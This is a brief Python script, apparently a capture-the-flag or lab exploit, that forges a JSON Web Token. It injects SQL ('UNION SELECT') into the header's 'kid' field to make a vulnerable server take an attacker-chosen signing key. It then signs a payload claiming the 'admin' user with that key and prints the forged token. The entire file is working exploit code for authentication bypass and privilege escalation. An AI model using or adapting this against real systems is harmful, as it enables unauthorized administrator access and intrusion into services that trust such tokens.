import base64
import hmac
import hashlib
import json
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlVOSU9OIFNFTEVDVCAnMSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"

header = {"typ":"JWT","alg":"HS256","kid":"asdfas'UNION SELECT 'rrr"}
payload = {"user":"admin"}

str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('utf8').rstrip("=")

key = "rrr"

def sign(str , key):
    return base64.urlsafe_b64encode(hmac.new(bytes(key,encoding ='utf8'), str.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip("=")

final = sign(str, key)
print(str+"."+final)


